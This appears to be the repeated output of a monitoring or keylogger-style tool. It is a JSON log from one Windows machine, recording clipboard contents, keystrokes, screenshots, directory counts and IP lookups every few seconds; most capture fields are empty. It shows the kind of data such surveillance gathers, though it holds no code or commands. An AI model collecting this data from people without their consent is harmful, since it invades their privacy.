{"timestamp": "2025-06-14T08:11:21.552549+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "8946fa92ab6906ad412ebe85780032a03e1fad0d871a95f2b8ac917cef7226fa", "_raw_log_hash": "6e7a578f579b0c30252510aa18aecb223fcb6b75953e11da6597c95309048a79"}
{"timestamp": "2025-06-14T08:11:35.117703+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "a31bd09e31bcf4f8b32645a1c596919b53ecd8a61310d19710c75b3c08474b86", "_raw_log_hash": "a56accaebc80b34be65e932403c37376c9e25073585d037e01503b53c9e3fc7f"}
{"timestamp": "2025-06-14T08:11:48.722452+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "888ae690d9f13ac0e5b1332ea91405195c4e79c9ba570c58f127c7af0cc6c493", "_raw_log_hash": "617c9881e0ffbad6286f98440023acebc3d336b2e7c614a822497e0a4da289ec"}
{"timestamp": "2025-06-14T08:12:02.225047+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "ce789f18653aa77397c3fad1a210a4dc28eecfbf5e42f038951918d03c4d810f", "_raw_log_hash": "9b69770184e59b47751ce953741e83ba80f022c4c5c78cf81e1ef23e4d013dc6"}
{"timestamp": "2025-06-14T08:12:15.846072+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "a7f7c9728560666d8b0bb16a9a71ce7922f1b2e0b0e2e253c969c5aa036fb164", "_raw_log_hash": "e330365ff69a7369219162938cda490f61edba76470ebbbe4f883f375ceed67f"}
{"timestamp": "2025-06-14T08:12:29.410670+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "3e1d370827a01967369027a32b0c04f94f5ff292f1cdb9af36bcd55bdb8c77d8", "_raw_log_hash": "b624735a4889867d6256431ab1cc34c2ec1e0ee564cd374aee704ec5fc0de4ab"}
{"timestamp": "2025-06-14T08:12:42.913781+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "f11016d767d9c1eac4cc3d877b7051fb17888a036273533a46f457c056adb83a", "_raw_log_hash": "ccab62e7d5c89b8918e6b5c4669b2bae719acea349b9e42370951000349a9bde"}
{"timestamp": "2025-06-14T08:12:56.454120+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "44ad1e967a2ef58dfb7fc4246bf14bc26e89d9da561a03e5b07358a2a2a6cbb2", "_raw_log_hash": "3f677ce95e9c47088ccee02b8dafdf0648a1a1f1d0775f465f893e08888f97fc"}
{"timestamp": "2025-06-14T08:13:10.007728+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "7e0d428cb6c1b09bd4dc4419e706f39f99598f668870bc6f0c550cf8d11a414f", "_raw_log_hash": "d8c023c9557ce4364c9c99de7fd43031b7e60ed4bdfe452172c5303b25e3a49a"}
{"timestamp": "2025-06-14T08:13:23.574386+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "f7a666588517aad1bebaecc227a4e9ca714d327d3fae101981162b81d3126d8b", "_raw_log_hash": "4d184e541d1d2132f7fd3535b616c5e68a0f6d29fa51d4970158330a893f09bd"}
{"timestamp": "2025-06-14T08:13:37.114936+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "6854d3452009a4e1cc7fd0385367332330ef73f276ed56a47d01dd04edec5858", "_raw_log_hash": "f66d2bcf454931cda6174f04d441faa8af0d695c008942384ab436cdb9ac9d63"}
{"timestamp": "2025-06-14T08:13:50.734704+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "b601ffbe0a98b815b1c92cfeb7bb50071755faaf8a6f2928b538da39f9239959", "_raw_log_hash": "777e201b4d774732356d51cbb702a0d7df1fb6f919fb2979100113e9d1ed3f45"}
{"timestamp": "2025-06-14T08:14:04.273644+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "7c090655f1a9c42cded9cfc75b3b5f0da7534ed1db2d083bc94916f08c39a804", "_raw_log_hash": "233b0ba97fc0d410aa7f3fc3ae3169f3e904ad03f832be06b262f2a1a51523df"}
{"timestamp": "2025-06-14T08:14:17.775405+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "d4dec6ce52772e0952b3dce32637869586d98e4a36b780c733d057c3f291554a", "_raw_log_hash": "46b1ba838af55548d005cc4a010e578c119a50a0b2919f41b66de0919aa0bd68"}
{"timestamp": "2025-06-14T08:14:31.320439+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "89c8988cce466fc06b2e6d5952b3a03a1fa974ee709455d9d6740bed4114aadf", "_raw_log_hash": "ba1f4484c4226d3d99c514a4c8d39d949c975a5027a067bf75837592a474dcf2"}
{"timestamp": "2025-06-14T08:14:44.928526+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "60cc3138f7695d1d7843f7cc09dc0668e113a6a32221ed6664813eeadfdcb18f", "_raw_log_hash": "1dfd1bc01938d2697400e0d199df930ef436839ac8a77e3e54ade51c883e7d75"}
{"timestamp": "2025-06-14T08:14:58.472272+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "0d000d963782f12f7a7cf776bbd21dee777bf11c7c4ddaa40565a7c8dc3cd672", "_raw_log_hash": "9ca4872d0f2e87d454e2aa984cec89e401d70ca270df859b53e228b08c152071"}
{"timestamp": "2025-06-14T08:15:12.016512+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "df4a24de52ebe0e38a3715c79ef8ae07f9cf22ca087a7ba1acdcccbc570e820a", "_raw_log_hash": "1b2b0b884fe6c5d20bc2d67d672cbcdd21c35a22a59625152bc7b864c952c3fa"}
{"timestamp": "2025-06-14T08:15:25.500480+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "cb285da22452b26c37040ea85623e6aa833b71dd6ab455f91350a82bad0948e4", "_raw_log_hash": "93f6c119a533f0e6ac03824715013c581a4f9fa5c653a119e9c5b295964be9f7"}
{"timestamp": "2025-06-14T08:15:38.977938+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "c3b6fa1fa9a6a8eac1567d1f6e236d4e36f3641b959ff31a3e2a2814d83840cc", "_raw_log_hash": "097db7a05c1c2a6f9cd2c4c7993002162dc879d8b11b9e548547067b9ecb3cc1"}
{"timestamp": "2025-06-14T08:15:52.628649+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "e5471158ffc39065b2ca34ee8c6a2d176fa3818516b6d30bb1fbf9f34bc75efa", "_raw_log_hash": "41ae861c2ef691a8858fe07b3e2a04b366114db3878e4b281109e9ba5c0801d6"}
{"timestamp": "2025-06-14T08:16:06.133140+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "822da47080a307c1f64a2f0c8e6673fdb922127b9b827b4edf88cfeea826e890", "_raw_log_hash": "122c73b6a45736a525ba6df398c1093ed82c719514480b1b91d05de0ad6de385"}
{"timestamp": "2025-06-14T08:16:19.737217+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "b88d687005b6a5fa849484cbd0f2d12afbb6ac37e6858351983a8290397ec33b", "_raw_log_hash": "9025372d0abf9fc95eef7dc295e117898eba7b654d162b32f94f6e3cc6526632"}
{"timestamp": "2025-06-14T08:16:33.261363+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "cbc514ad8e4b2cc66331beaf72225907294f3b6520b44c209191a05a4aad704a", "_raw_log_hash": "c318d644bd456ea9432e5a66bf8bf3580726450c7442435f81cc03a96782a9a8"}
{"timestamp": "2025-06-14T08:16:46.795962+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "98543f5e71d20a5e19bf9b5cdc829419c0e30e59ffef912ec0bb2452f55ae8e1", "_raw_log_hash": "a46f97125be9a325476d174b7d36a06f3c83893c3e6587eb18b5c65a78a01488"}
{"timestamp": "2025-06-14T08:17:00.306067+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "6144980e450e2aa60761f38a11a77d51fe24590f0adfaccad8d2db94b720a2f3", "_raw_log_hash": "a98d3c1f1c8ce613f14fdf73d729bafd067588759bfed6572ab4b19af9d9a949"}
